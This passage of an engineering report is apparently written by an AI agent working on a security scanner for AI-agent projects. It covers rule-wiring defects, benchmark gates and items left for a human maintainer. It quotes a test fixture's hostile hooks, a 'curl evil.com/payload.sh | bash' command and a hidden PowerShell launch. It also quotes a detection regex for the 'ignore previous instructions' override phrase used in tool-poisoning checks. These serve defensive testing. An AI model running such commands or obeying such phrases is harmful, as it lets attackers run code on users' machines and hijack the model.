`execFile`/`spawn` do not involve a shell. Reporting argument injection under
that title is reporting it under the wrong rule, and 84 of them buried the 50
that are the rule's actual subject. **The counter-argument is real and it is
yours**: if argument injection should be detected, it wants its own rule with its
own title and remediation, and then this suppression should be narrowed to "fixed
program AND fixed argv" — which is `_call_args_are_constant`, still present and
still applied first.

### 25. AGENT-034's TypeScript emission does not match its published definition

Sharper than RUN3 item 20, and found by the W15 audit rather than inferred.

`docs/RULES.md` and `rules/builtin/asi_coverage_v030.yaml` both define AGENT-034
as **"Tool Function Without Input Validation"**: CWE-20, detection type `ast`,
`pattern_type: tool_no_input_validation`, gated on `@tool` / `@function_tool` /
`@register_function` decorators and `str`/`Any` parameter types.

The Python scanner implements exactly that, and gates it on
`tool_boundary_detector.is_tool_entry_point()` — outside a tool entry point,
nothing fires. The TypeScript scanner emits the same rule ID under the titles
"Shell Command Execution" and "Dangerous Code Execution", with **no tool-boundary
gate at all**, and that path produced 187 of the 191 AGENT-034 findings on the
audit target.

**`agent_audit/analysis/ts_tool_boundary_detector.py` is the missing gate, it is
325 lines long, it has a full test file, and nothing in the package imports it:**

```
$ grep -rn "ts_tool_boundary" packages/audit/agent_audit/ tests/
tests/test_analysis/test_ts_tool_boundary_detector.py:14:from agent_audit.analysis.ts_tool_boundary_detector import (
```

Its own unit test is the only thing in the repository that mentions it. Third
instance of the pattern in three runs, and the largest by findings.

**I did not wire it**, for two reasons. It is written as a *confidence* helper
(`get_tool_confidence_boost` returns a boost inside a boundary), not as the hard
gate the Python side uses, so wiring it as a gate is a design decision rather
than a connection. And doing so would remove essentially every TypeScript
AGENT-034 finding and invalidate a dozen existing tests that encode the current
behaviour — far beyond a predicate's blast radius.

**Three options, recommendation last:**
1. Split the rule: give the TypeScript shell-execution emission its own ID and
   title, and leave AGENT-034 as the tool-input rule it is documented to be.
2. Gate the TypeScript path on `ts_tool_boundary_detector`, promoting it from a
   confidence helper to a boundary gate, matching the Python path exactly.
3. Amend the published definition of AGENT-034 to cover both.

I recommend **1**. It is the only one that leaves both behaviours available, and
it makes the reachability test above meaningful for the rule — right now a
directory scan reaches "AGENT-034" through three different pattern types with
three different meanings.

### 26. MCP config findings bypass every analyzer and are all BLOCK

Found while triaging W16. All 20 findings the MCP fix restored carry
`confidence=1.0` and `tier=BLOCK`, because `cli/commands/scan.py` constructs MCP
security findings with no `confidence=` argument and takes the `Finding` default.

The consequence is concrete. The one genuine false positive among the 20 is
`API_KEY: "AKIAIOSFODNN7EXAMPLE"` — the AWS documentation example key, reported
as AGENT-004 Hardcoded Credentials at BLOCK. `analysis/placeholder_detector.py`
and `analysis/semantic_analyzer.py` exist to catch exactly that, and
`analysis/rule_context_config.py` names that exact string in a comment as
something that should be suppressed. **The AGENT-004 the secret scanner produces
goes through all of it; the AGENT-004 the MCP path produces goes through none of
it.**

The same wiring pattern, at rule granularity. Fix is to route MCP-derived
AGENT-004 through `semantic_analyzer` like the secret scanner does, and to give
the other MCP rules a real confidence rather than the default. **Not done**: it
changes tier assignment across an entire rule family, which is the boundary this
run was told not to cross unilaterally.

Related and smaller: findings 8 and 11 of the W16 table are the same config line
reported twice, as AGENT-004 and AGENT-031, both at BLOCK. That is the same
same-line redundancy `RULE_SUBSUMPTION_MAP` exists for.

### 27. Eighteen corpus additions, from the W16 triage

18 of the 20 restored MCP findings are correct against the rules' own published
definitions and the corpus does not label them. Adding those labels moves Layer 1
precision from **0.6853 to 0.7483** with no scanner change.

They are listed with fixture, rule and reason in `NIGHT_RUN_LEDGER.md` § W16.
**I added none of them** — ground truth is not mine to edit.

One deserves a decision rather than a transcription: `benign/validated/mcp_restricted.json`
is labelled a safe file, and AGENT-030 fires on it correctly, because the package
`@anthropic-ai/mcp-server-filesystem` is genuinely unpinned. The fixture is
restricted in *permissions* — path `./workspace`, `alwaysAllow: [read_file]` —
not in *supply chain*. Either the negative label narrows to the permission axis
or the fixture pins its version.

And one is genuinely AMBIGUOUS: AGENT-029 on `supply_chain_vulnerable.json` fires
because the server declares no path argument at all. The finding's text says "no
explicit path restriction configured"; the rule is titled "Overly Broad
Filesystem". Absent configuration is a proxy for broad access, not the same
claim. Excluding it moves precision 0.6853 → 0.6877.

### 28. `results/layer1.json` is two measurements behind the code

The committed file reads FP 91 / P 0.6829 — the W12 measurement. HEAD produces
FP 90 / P 0.6853. CI is unaffected: `run_all.sh:19` and `benchmark.yml:34` both
pass `--output-json results/layer1.json` immediately before the gate, so the gate
always grades a fresh measurement there. The staleness only bites a manual
`quality_gate_check.py` run on a tree where nobody ran the benchmark first, which
is how I first hit it.

Refresh rather than defect. Flagged because `results/layer1_v0.19.0.json` is cited
from `README.md` as the checked-in evidence for the headline figure, and it reads
F1 0.7784 against a current 0.7510 — see the claims table in the ledger, row 9.

### 29. Dead analysis modules with no findings attached

From the W15 runtime wiring matrix. None of these changes a finding on the audit
target, so per this run's brief they are notes, not tasks — recorded so the next
audit does not rediscover them:

- `analysis/confidence_matrix.py` — no importer, no caller anywhere.
- `analysis/env_tracer.py` — no importer, no caller anywhere.
- `analysis/dangerous_operation_analyzer.py` — imported by `python_scanner`; its
  call site at `python_scanner.py:3082` sits in the branch marked "Fallback to
  original logic if taint analysis fails", and `_analyze_function_taint` returns
  `None` only when `TaintTracker` **raises**. It runs on a taint-tracker crash and
  otherwise never. This is the module `CLAUDE.md` Phase 1 specifies in full, with
  its own test file. Verified with a textbook trigger — a `@tool` function taking
  `command: str` into `subprocess.run(command, shell=True)` — which reaches
  `tool_boundary_detector` and never reaches this.
- `analysis/tool_description_analyzer.py` — imported by three MCP scanners, never
  called on a directory scan. `mcp_config_scanner._detect_tool_poisoning` is
  defined and has **zero callers**, so AGENT-056/057 cannot fire from a static
  config. Confirmed with a designed trigger: an `.mcp.json` whose tool
  descriptions carry blatant injection text produces no AGENT-056/057. The live
  path is `mcp_inspector`, which is the `inspect` command against a running
  server. Pinned in `tests/test_rule_reachability.py::KNOWN_UNREACHABLE_MECHANISMS`.
- `rule_context_config.is_browser_test_pattern` — defined, never called. Worth
  saying that it should **not** be wired: its patterns are `page.evaluate(`,
  `page.goto(` and friends, which are the AGENT-045 triggers themselves, so using
  it as a suppressor would disable the rule entirely. It is a mis-designed helper,
  not a missing connection.

## Decisions taken (session 4, reversible, done)

- Ten denoise predicates, each with its own commit, its own measured delta, and
  regression tests split into suppression cases and controls. Noise 375 → 87 with
  all 20 high-value findings intact at every commit and Layer 1 true positives
  unchanged at 196.
- `tests/test_rule_reachability.py` added: fails when a rule fires on a
  file-argument scan and not on a directory scan; pins the orphan set, the
  known-dead mechanisms, and probe coverage at 52 of 72 rules.
- `RULE_SUBSUMPTION_MAP` extended with `AGENT-034: [AGENT-047]`, same-line only.
- No threshold, tier boundary, confidence value, ratchet, oracle, fixture or
  ground-truth label was changed.

## NEEDS-HEADY (session 5)

### 30. Gating AGENT-034 silences seven code-execution findings, one at BLOCK

W20 wired `analysis/ts_tool_boundary_detector.py` as a hard gate on AGENT-034, as
instructed. Measured effect on the audit target: noise **87 → 44**, high-value 20
unchanged, recall 0/6 unchanged, Layer 1 TP 196 / FP 93 / FN 40 unchanged, AVB
knowns unchanged. **No true positive is suppressed on either benchmark.**

The cost is on the audit target and it is itemised rather than absorbed. 57
AGENT-034 findings were removed. Their fates split three ways:

| n | shape | what remains on that line |
|---|---|---|
| 14 | Shell Command Execution | **AGENT-047** "Subprocess Execution Without Sandbox" — `RULE_SUBSUMPTION_MAP` was suppressing it under AGENT-034, and releases it now |
| 36 | Shell Command Execution | nothing |
| 7 | **Dangerous Code Execution** | nothing |

The 14 are arguably improved: AGENT-047 is the rule actually titled for subprocess
execution and is not tool-scoped, so a shell call outside a tool handler now
reports under the rule that describes it.

**The 7 are the problem, and one deserves naming.** The largest single loss is

```
AGENT-034  Dangerous Code Execution   tier=BLOCK  confidence=0.95  severity=critical
           return eval(expr)
```

`eval`, `new Function` and `vm.runInNewContext` are dangerous whether or not they
sit inside a tool handler. The tool-boundary constraint comes from AGENT-034's
definition as *"Tool Function Without Input Validation"* — a rule about unvalidated
tool input. It does not follow that dynamic code execution stops mattering outside
a tool. On the Python side that shape is reported under **AGENT-017 "Unsandboxed
Code Execution"**, which has no tool-boundary gate at all.

**The narrow fix is one line** — put only the shell-execution pattern types in
`TOOL_SCOPED_RULES` and leave `ts_eval_exec` ungated. I did not take it, because
which pattern types belong inside the gate *is* the gate's semantics, and the brief
is explicit that semantics are your decision and not a nudge I make to avoid
collateral damage. Three options:

1. **Leave as landed.** Consistent with the published definition; loses 7 findings
   including a BLOCK-tier `eval`.
2. **Narrow the gate to shell execution.** Keeps the eval family. One-line change,
   and the seven come back.
3. **Split the rule** (RUN4's item 25 recommendation): give the TypeScript
   code-execution emission AGENT-017's ID, or its own, and gate only what AGENT-034
   is documented to cover.

I recommend **3**, and **2** as the immediate step if 3 is not being done now.
Under 1, agent-audit does not report `eval(expr)` in a TypeScript file that has no
recognised tool entry point, which is a capability regression against a real RCE
sink.

### 31. The AGENT-120 fix turns a CI job red, through a gate nobody consolidated

`d4d2850` makes AI-tool hook discovery recursive. Three findings become possible,
all in `tests/fixtures/agent_architecture/vulnerable_hooks/` — a fixture written
for AGENT-120, containing `powershell -WindowStyle Hidden` and
`curl -s https://evil.com/payload.sh | bash`. All three are true positives by the
rule's definition and by the fixture's own name. **The corpus labels none of
them**: no label anywhere in `labeled_samples.yaml` cites AGENT-120 or
`vulnerable_hooks`, across 81 labelled files. AGENT-120 shipped in v0.19.0 with
zero ground-truth coverage.

They therefore score as false positives. Layer 1 precision 0.6853 → 0.6782, F1
0.7510 → 0.7467.

That clears `gates.yaml` (`f1_min: 0.72`) and `quality_gate_check.py` exits 0. It
does **not** clear `tests/benchmark/precision_recall.py:503`:

```python
if result.f1_score < 0.75:
    sys.exit(1)
```

and `.github/workflows/benchmark.yml:33` runs that script with `continue-on-error`
deliberately removed (line 37). So `pytest`-green, `quality_gate_check`-green, and
the benchmark job red.

**This is the two-gates contradiction again.** `gates.yaml` opens by declaring
itself "THE SINGLE SOURCE OF TRUTH" and describes deleting the inline workflow gate
because two gates on one layer is how a contradiction survived six months. The
inline gate went; this hard-coded floor inside the script did not. Before this run
F1 was 0.7510 — **one thousandth** above it.

**I did not touch either threshold.** Lowering 0.75 is exactly what the `gates.yaml`
header forbids ("Never lower them to make a build pass"), and it would also be a
threshold change, which this run was told not to make. Three resolutions:

1. **Label the three findings** (they are correct), which lifts F1 back over 0.75
   on its own. This is ground truth, so it is yours.
2. **Delete the `sys.exit(1)` from `precision_recall.py`** and let `gates.yaml` be
   what its header says it is. This is the consolidation that was started and not
   finished.
3. Reconcile the two floors deliberately.

I recommend **2 then 1**. 2 removes a second source of truth; 1 fixes the number.

### 32. `RuleEngine.evaluate()` — retire it. Wiring it activates 3 of 84 blocks

W21 measured both resolutions rather than arguing them. The scratch wiring was
committed as `3f52f90` behind `AGENT_AUDIT_WIRE_YAML_RULES=1` and **reverted in
`25636c3`**; nothing of it remains in the tree.

**Why wiring does almost nothing, which is the decisive fact.** `_evaluate_rule`
dispatches on `pattern.get('type')` and implements three branches: `python_ast`,
`function_call`, `regex`. Across the 52 builtin YAML rules there are 84 pattern
entries, and:

```
values of the 'type' key the evaluator dispatches on:
  {'<MISSING>': 81, 'python_ast': 1, 'function_call': 1, 'regex': 1}
```

**81 of 84 entries have no `type` key at all.** They use `pattern_type`, which the
evaluator never reads. The three that do dispatch belong to AGENT-001 (two) and
AGENT-004 (one). So this is not a dormant mechanism waiting to be switched on; it
is an evaluator that does not parse the dialect the rules are written in.

**Measured delta, flag on vs. off at the same commit:**

| | fixture corpus | Layer 1 TP | FP | FN | precision | F1 | audit target noise |
|---|---|---|---|---|---|---|---|
| off (shipping) | 291 findings | 196 | 93 | 40 | 0.6782 | 0.7467 | 44 |
| on | 314 findings | **197** | **115** | **44** | **0.6314** | **0.7125** | 45 |

Wiring costs **4.7 points of precision and 0.034 of F1, loses 4 true positives**, and
gains 1. The +35 AGENT-001 findings largely duplicate lines already covered, and
dedup/subsumption then removes the AGENT-034 and AGENT-047 findings that were
matching labels — which is how wiring a rule engine manages to *reduce* recall.

**Recommendation: retire.** Say in `CLAUDE.md` and `docs/ARCHITECTURE.md` that YAML
carries rule metadata and detection lives in scanners, and mark `evaluate()` /
`_evaluate_rule` as dead or delete them. The alternative — rewriting `_evaluate_rule`
to parse `pattern_type` and the ~70 bespoke keys the YAML actually uses — is
implementing 49 new rules from specifications nobody has validated, not wiring.

**This is not cosmetic.** `CLAUDE.md`'s rule-authoring checklist instructs
contributors to write those blocks, and `docs/ARCHITECTURE.md:134` draws
`RuleEngine (evaluate)` as the box that runs them. Five of the six rules withdrawn
in W19 are exactly what that instruction produces: a rule that is published,
documented, tested at the YAML-loading level, and unable to fire. Whichever way this
goes, the checklist must not survive unchanged.

### 33. Twelve advertised rules have no fixture anywhere in the repository

From the W19 producer audit. AGENT-002, 027, 037, 038, 039, 040, 042, 048, 052,
055, 056, 057 all have working producers — each fires on a designed trigger built
from its own source condition, transcripts in `NIGHT_RUN_LEDGER.md § W19.3` — and
**no input in `tests/fixtures` reaches any of them.** Their only demonstration that
they work is a hand-built trigger in that ledger.

Two of them, AGENT-056 and AGENT-057, were recorded by RUN4 as *unreachable*
mechanisms on the strength of a method with no callers. That method
(`_detect_tool_poisoning`) is not the producer; `_check_tool_poisoning_in_config` is,
and it runs on every config scan. The registry entry was wrong and is corrected.

Worth a separate look while fixtures are being written:
`analysis/tool_description_analyzer.py`'s injection regex is
`ignore\s+(previous|all|above|prior)\s+(instructions?|rules?|constraints?)`, which
requires the noun immediately after the first qualifier. It matches "ignore previous
instructions" and **not** "ignore all previous instructions" — the more common
phrasing, and the one RUN4's trigger used. The rule works; its best-known trigger
string does not match it.

Adding fixtures is corpus work and I did none of it.

### 34. AGENT-054 is advertised but no scan can reach it

`MCPBaselineManager` is constructed only in `cli/commands/inspect.py`. Drift
detection compares a live server against a stored baseline, so no static input
produces AGENT-054 during `agent-audit scan`. It is a real, working rule reachable
through a different command, and it sits in `docs/RULES.md` beside 65 rules a scan
does reach with nothing distinguishing it.

Now disclosed in the Withdrawn Rules section of `docs/RULES.md` and pinned in
`tests/test_rule_producers.py::SCAN_UNREACHABLE_BY_DESIGN` with a runtime check, so
it fails if a scan ever starts producing it. No code change; the question of whether
`inspect`-only rules should be listed with `scan` rules is yours.

## Decisions taken (session 5, reversible, done)

- `d4d2850` — AI-tool hook and `.mcp.json` discovery made recursive. AGENT-120 could
  not fire below the scan root; sixth instance of the non-recursive-discovery defect.
- `6adedd1` — six rules with no producer withdrawn from the advertised set, 72 → 66,
  each with a stated reason in `WITHDRAWN_RULES` and in `docs/RULES.md`. IDs retired,
  not recycled. No YAML rule definition was deleted, so item 32's measurement stands.
- `2ee8345` — AGENT-034 gated on a tool entry point on the TypeScript path.
  Membership only; `get_tool_confidence_boost` deliberately unused.
- `3f52f90` / `25636c3` — W21 scratch wiring, committed for traceability and reverted.
- `tests/test_rule_producers.py` added: an advertised rule with no producer fails the
  suite, with no allow-list. `KNOWN_ORPHAN_RULES` in the RUN4 guard is now empty.
- No threshold, tier boundary, confidence value, ratchet, oracle, fixture or
  ground-truth label was changed.

---

# RUN 6 — items 35 to 39

Same rule as before: everything under `NEEDS-HEADY` was deliberately **not** acted on.
Everything else was done and is reversible.

> **Correction to RUN5, item 30's neighbourhood.** `NIGHT_RUN_LEDGER.md § W19.5` and
> `RUN5_REPORT.md § 1` state that `git_clone_exec.py:14` emits AGENT-034 at the exact
> labelled line, and conclude that three of the five AGENT-015 labels are detected under a
> different rule ID. It emits nothing — at HEAD and at `e4a939d`, in both scan modes,
> verified from a worktree at that commit. **Two** are detected under a different ID and
> **three** are genuine misses. The corrected arithmetic is in
> `docs/decisions/AGENT-015_RESOLUTION.md`.

---

## NEEDS-HEADY

### 35. `vulnerable_hooks` produces four unlabelled true positives, not three

The fixture written for AGENT-120 is finally being read, and everything it produces is
correct by the rules' own definitions. None of it is labelled — the corpus contains no
sample naming that fixture and **no label citing AGENT-120 anywhere**, across 81 files.
All four are therefore scored as false positives.

| file | line | rule | severity | what it is |
|---|---|---|---|---|
| `tests/fixtures/agent_architecture/vulnerable_hooks/.claude/settings.json` | 6 | AGENT-120 | critical | `powershell -WindowStyle Hidden` SessionStart hook |
| `tests/fixtures/agent_architecture/vulnerable_hooks/.claude/settings.json` | 12 | AGENT-120 | critical | `curl … \| bash` PreToolUse hook |
| `tests/fixtures/agent_architecture/vulnerable_hooks/.mcp.json` | 4 | AGENT-120 | critical | the same `curl … \| bash` as an MCP server command |
| `tests/fixtures/agent_architecture/vulnerable_hooks/.mcp.json` | 1 | AGENT-032 | medium | stdio MCP server with no sandbox isolation |

RUN5 recorded three. Three is right for the *precision movement* — FP went 90 → 93 at
`d4d2850`, and those three are the AGENT-120 findings that fix made reachable. The AGENT-032
finding was already firing and already unlabelled before it. **For labelling purposes the
number is four.**

Labelling all four is worth roughly +4 TP / −4 FP / −4 FN against Layer 1 and would raise
the ratchet. Ground truth is yours; I did not touch it.

### 36. AGENT-049 is detected and then thrown away — a seventh rule that cannot fire

Found by the new fixture-coverage guard, and it is a different mechanism from the six
withdrawn in v0.19.3.

`python_scanner._check_unsafe_deserialization` emits an `unsafe_deserialization` pattern on
`pickle.load` at confidence 0.85 with an ASI-04 id and a written note.
`PATTERN_TYPE_TO_RULE_MAP` maps it to AGENT-049. `_create_finding_from_pattern` then does
`self._rules.get("AGENT-049")`, the rule table is loaded from the 52 builtin YAML
definitions, **AGENT-049 is not one of them**, the lookup returns `None`, and the finding
is never constructed. Measured end to end in `NIGHT_RUN_LEDGER.md § W26`.

Twenty advertised rules have no YAML definition. Nineteen are unaffected because their
producers build `Finding` objects directly. AGENT-049 is the only one reachable solely
through the pattern-type table, so it is the only one this silences — and `ts_unsafe_
deserialization`, the TypeScript half, dies the same way.

**Why I did not fix it.** The fix is small — a YAML block supplying metadata for detection
that already works — but it is not free. Exactly one file in the graded corpus produces the
pattern, at a line the corpus already labels under **AGENT-018** with the note "Unsafe
pickle deserialization". Supplying the YAML makes AGENT-049 fire there and adds an
unlabelled finding on an already-labelled line, so the change is a rule-set decision *and*
a corpus decision at once. Three coherent resolutions:

1. **Add the YAML definition and label the line for AGENT-049**, keeping the AGENT-018
   label if both rules genuinely apply (they describe different aspects of the same line —
   memory poisoning versus unsafe deserialization). Cleanest; needs a ground-truth edit.
2. **Add the YAML definition and accept one unlabelled finding** until the corpus catches
   up. Costs about one point of precision.
3. **Withdraw AGENT-049**, as the six were. Honest, but wasteful: unlike those six, the
   detection exists and works, and CWE-502 is a real gap to leave open.

I recommend **1**. This is the reverse of the six withdrawals — there the rule was a
document with no code, here it is code with no document.

Pinned meanwhile in `tests/test_rule_fixture_coverage.DETECTED_BUT_DISCARDED`. The pin
asserts the *mechanism* — fixture exists, rule does not fire, rule still has no YAML — so
it fails the moment anyone fixes it, and cannot decay into an allow-list.

### 37. Six more second definitions of the same threshold, two of them unreachable by me

From the W24 audit. The one that mattered — `precision_recall.py`'s own `f1 < 0.75` — is
deleted, and `gates.yaml` is now what its header says it is. Six remain.

**Two are dead files the guard hook protects.** `tests/benchmark/quality_gates_v2.yaml` and
`tests/benchmark/quality_gates.yaml` both carry Layer 1 floors of 0.90 / 0.85 / 0.87, and
the second carries an entire per-ASI precision/recall table as well. Neither is referenced
by any code — only by ledger entries describing them as dead. The night-guard's `PROTECTED`
pattern is `quality_gates[^/]*\.ya?ml$`, which matches both by name, so I could not delete
them and did not work around it. **`git rm` on each is the entire fix.**

**Two are the same defect in the Layer 2 path.** `owasp_coverage_min: 10` is written three
times — in `gates.yaml`, in `tests/benchmark/benchmark_config.yaml`, and as a literal
`.get(key, 10)` default inside `run_benchmark.py` — and `run_benchmark.py` blocks on its own
verdict via `sys.exit(0 if PASS else 1)`. I left it alone because `layer2` is
`enabled: false` in `gates.yaml` and the whole path is stale (item 3), so consolidating it
belongs with the decision to re-enable it.

**One is public-facing.** `docs/F1_REPRODUCTION.md:75` says the CI gate inside
`precision_recall.py` "is set at `f1 < 0.75` (line 485) — passes today". The gate is gone,
the line number was already wrong, and it was failing rather than passing. Listed in
`docs/decisions/METRICS_RETRACTION.md` § 5 rather than edited.

**One is `scripts/run_benchmark.sh`,** which scores the project out of 100 using its own
0.90 / 0.85 / 0.87 thresholds. It gates nothing, but it is a fourth copy of those numbers.

### 38. `tests/rule_fixtures/` needs a decision about whether it is a corpus

I added a second fixture tree, deliberately outside the graded corpus, and it should be an
explicit choice rather than a fait accompli.

**The case for keeping it separate is measured, not argued.** Grafting the sixteen triggers
into the graded corpus costs **+26 false positives, −5.6 points of precision, −0.035 F1**,
and would force the ratchet down from `f1_min: 0.72` to 0.69 and `precision_min: 0.66` to
0.60 — a published floor deflated entirely by test scaffolding. Full measurement in
`NIGHT_RUN_LEDGER.md § W26`.

**The case against** is that two fixture trees is two places, which is the defect this whole
run is about. The difference is that they answer different questions and are graded by
different things, and `tests/rule_fixtures/README.md` says so at the top. If you would
rather have one tree, the coherent version is one tree **plus labels for every trigger** —
that is 16 new corpus entries and a corpus decision, not a move.

### 39. The corpus-label guard is committed red, and only you can make it green

`tests/test_corpus_label_rules.py` fails today: six labels cite rule IDs no code path can
construct. It is committed failing on purpose — the labels are not mine to edit and a guard
that passes while the defect is present is what this project keeps rediscovering — but it
does mean the suite reads **1 failed** until the labels are settled.

The fix is three `rule_id` edits plus a decision about three more; both are laid out with
measured arithmetic in `docs/decisions/AGENT-015_RESOLUTION.md`. Retargeting the three
retargetable labels alone takes Layer 1 from F1 0.7467 to **0.7581**.

---

## Decisions taken (session 6, reversible, done)

- `78d8fe5` — `precision_recall.py`'s own `f1 < 0.75 → sys.exit(1)` deleted. The script
  measures; `quality_gate_check.py` against `gates.yaml` decides. The printed report's
  hard-coded 0.90 / 0.85 / 0.87 / 0.05 now come from `gates.yaml` too. Same measurement
  either side, exit code 1 → 0.
- **No threshold was changed.** The ratchet was re-derived rather than assumed — measured
  minus observed run-to-run spread minus a 0.02 margin, truncated — and the derivation puts
  `f1_min` at 0.72 and `recall_min` at 0.81, exactly where they already are, and
  `precision_min` at 0.65 against 0.66 in the file, which is tighter than the method and
  already met. The spread is **zero** across ten identical runs. The brief's premise that
  the ratchet had to be reset does not hold: `gates.yaml` carries 0.72, not 0.75.
- `950e308` — `tests/test_corpus_label_rules.py`, no allow-list, committed failing (item 39).
- `cc7da1b` — `docs/decisions/METRICS_RETRACTION.md`. No public claim edited.
- `tests/rule_fixtures/` — sixteen trigger fixtures, each built from its producer's own
  source condition and each verified to fire when scanned on its own.
  `tests/test_rule_fixture_coverage.py` fails the suite if an advertised rule is produced by
  no input anywhere in the repository. **Layer 1 delta: exactly zero, measured.**
- No oracle, no dataset, no ground-truth label, no existing fixture, no confidence value,
  no tier boundary and no threshold was modified. No push, merge, rebase, tag or publish.

---

# RUN 8 — items 40 to 43

Same rule as before: everything under `NEEDS-HEADY` was deliberately **not** acted on.
Everything else was done and is reversible.

## Decisions taken (session 9, reversible, done)

- `fda9f06` — `scripts/finalize_run7.sh` applied by Heady and committed. F1 0.746667 →
  0.758095, TP 196→199 / FP 93→90 / FN 40→37, exactly the RUN7 prediction. Ratchet raised
  to `recall_min` 0.82 / `f1_min` 0.73; two dead threshold files removed.
- `e9291ea` — **W38.** `quality_gate_check.py` could exit 0 on a stale results file and on
  no results file at all. Layer 1 results now carry a provenance stamp over the corpus, the
  scanner source and the interpreter's `agent_audit`; a missing file for an
  enabled+blocking layer is a FAIL; `--layers` replaces silence-as-success. No threshold
  changed. Guard: `tests/test_gate_provenance.py`.
- `9b366fc` — **W40/W41.** Issue #10 fixed (AGENT-041 receiver gate). Issue #8: two of four
  claims fixed, one downgraded, one improved. Layer 1 unmoved across all four scanner
  changes, because the corpus contains none of these shapes.
- `87baefc` — **W42.** One rule count, 66, on eighteen surfaces; metrics corrected to the
  measured values with the command beside each; `tests/README.md` gains the retraction.
  Guard: `tests/test_published_rule_count.py`.
- **W43.** Slopsquatting assessed and declined as a rule, with the measurement.
  `docs/decisions/SLOPSQUATTING.md`; scope for v0.21.0 in `NEXT_ROUND.md`.
- No oracle, no dataset, no ground-truth label, no existing fixture, no confidence tier
  boundary and no threshold was modified by me. No push, merge, rebase, tag or publish.

---

## NEEDS-HEADY

### 40. Agent-Vuln-Bench results carry no provenance stamp

Layer 1's staleness hole is closed; the same hole in the AVB path is not.
`quality_gate_check.py` reports it rather than enforcing it:

```
ℹ️ [INFO] Agent-Vuln-Bench results at results/avb_results.json carry no provenance
   stamp — unlike Layer 1, nothing here can tell a current measurement from a stale one
```

**Why I did not fix it.** The file is written by `tests/benchmark/agent-vuln-bench/harness/`,
whose dataset lives under a `datasets/` path the guard hook protects, and stamping it means
changing that harness rather than the gate. It is a small change with the design already
settled — reuse `tests/benchmark/provenance.py`, fingerprint the dataset and the scanner
source, compare content and never time.

Leaving it as `INFO` rather than `WARN` is deliberate: exit 2 on every CI run becomes noise
that is filtered, and a filtered warning is worse than a visible one.

### 41. The repository's own `.agent-audit.yaml` has been disabled since February

```
$ git ls-files | grep agent-audit.yaml
.agent-audit.yaml.bak
packages/audit/.agent-audit.yaml

$ ls -la .agent-audit.yaml*
-rw-r--r--  294  Feb  3  2026  .agent-audit.yaml.bak
```

`precision_recall.run_scan` renames the nearest `.agent-audit.yaml` to `.yaml.bak` for the
duration of a benchmark scan and restores it in a `finally`. On 2026-02-03 a run did not
reach the restore, and **the renamed file was committed in that state**. The repository root
has had no `.agent-audit.yaml` for six months.

Layer 1 is unaffected — the benchmark disables that file on purpose, so a missing one and a
renamed one measure identically, which is exactly why nothing noticed. What is affected is
every `agent-audit scan .` against this repository, which has silently not honoured the
project's own ignore rules since February.

The fix is `git mv .agent-audit.yaml.bak .agent-audit.yaml`, and it is yours because
restoring it changes what a scan of this repository reports. Worth pairing with a guard
that fails if a `.yaml.bak` is ever tracked, and with making `run_scan` restore on
`SIGINT` as well as on exception.

### 42. Issue #10 can now close, and #8's reply needs re-sending

`ISSUE_TRIAGE.md` has an addendum with both updated verdicts and both redrafted replies.
Nothing was posted — the guard blocks `gh` writes and that remains correct.

| # | action |
|---|---|
| #10 | **close as fixed**, with the before/after and the note that the benchmark did not move |
| #12 | close as **won't fix, documented** (unchanged from RUN7) |
| #8 | reply, **leave open** — two of four claims fixed |
| #11 | reply, **leave open** — unchanged |
| #5 | label `enhancement` / `needs-design`, **leave open** — unchanged |

### 43. The producer set for one line is wider than any rule table shows

W41's measurement: one `subprocess.run` line is reported by **three separate producers**,
and gating two of them relocated the finding to the third rather than removing it.
`CLAUDE.md` warns that three *pattern types* map to AGENT-034; the set of producers that
can fire on a single call is wider again, and nothing enumerates it.

This is not a bug with a fix — it is a missing view. Every false-positive report so far
(#8, #10) has cost more than it should because "which producers claim this line" is a
question nobody can answer without reading the scanner. A `--explain <file>:<line>` mode,
or a debug dump of the pattern list before rule mapping, would pay for itself on the next
report.

Recorded rather than built, because it is a CLI surface decision and v0.20.0 is a
correction release.
